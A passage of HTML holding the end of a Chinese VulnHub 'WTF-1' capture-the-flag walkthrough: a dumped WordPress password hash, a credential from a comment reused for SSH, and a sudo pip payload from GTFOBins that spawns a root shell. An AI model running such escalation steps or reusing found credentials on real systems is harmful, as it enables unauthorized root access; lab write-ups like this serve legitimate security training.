class="operator">|</span> $P$Bn5.YpTbLgCbD2Ji7QLutRiZpRHeAS0 <span class="operator">|</span> admin         <span class="operator">|</span> ra<span class="variable">@ra</span>.com  <span class="operator">|</span>          <span class="operator">|</span> <span class="number">2019</span><span class="number">-11</span><span class="number">-21</span> <span class="number">16</span>:<span class="number">48</span>:<span class="number">31</span> <span class="operator">|</span>                     <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> admin        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> </span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span>   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/968.png" alt="图片"></p>
+<p>就在这个时候，我发现了一个注释引起了我的注意：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`Db]f&#123;He3HgO`(z</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/969.png" alt="图片"></p>
+<p>抱着试一试的心态登陆 <code>sa</code> 用户的 <code>SSH</code> 发现登陆成功：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/970.png" alt="图片"></p>
+<h2 id="pip提权拿到Flag"><a href="#pip提权拿到Flag" class="headerlink" title="pip提权拿到Flag"></a>pip提权拿到Flag</h2><p>通过查看那些命令是可以以 <code>root</code> 权限执行的发现了 <code>pip</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/971.png" alt="图片"></p>
+<p>这个时候通过 <code>https://gtfobins.github.io/</code> 这个提权手册找到了现成的 Payload <code>https://gtfobins.github.io/gtfobins/pip/#sudo</code> ，利用 <code>sudo</code> 提权为 <code>root</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/972.png" alt="图片"></p>
+<p>最终在 <code>/root</code> 目录下拿到 <code>flag</code>  ～</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次靶机的相对于来说还是挺有新意的，接触了到<code>MITM</code>（中间人攻击）学会了这种思路就方便以后遇到就可以利用这种思路去解题。</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/11/Vulnhub-WTF-1/">http://example.com/2020/02/11/Vulnhub-WTF-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/MITM/"># MITM</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/11/Vulnhub-dpwwn-1/">VulnHub通关日记-dpwwn_1-Walkthrough，定时任务反弹SHELL拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/29/ATTCK-Red-Teaming-1/">ATT&CK-RedTeaming-实战入侵演练，横向渗透拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
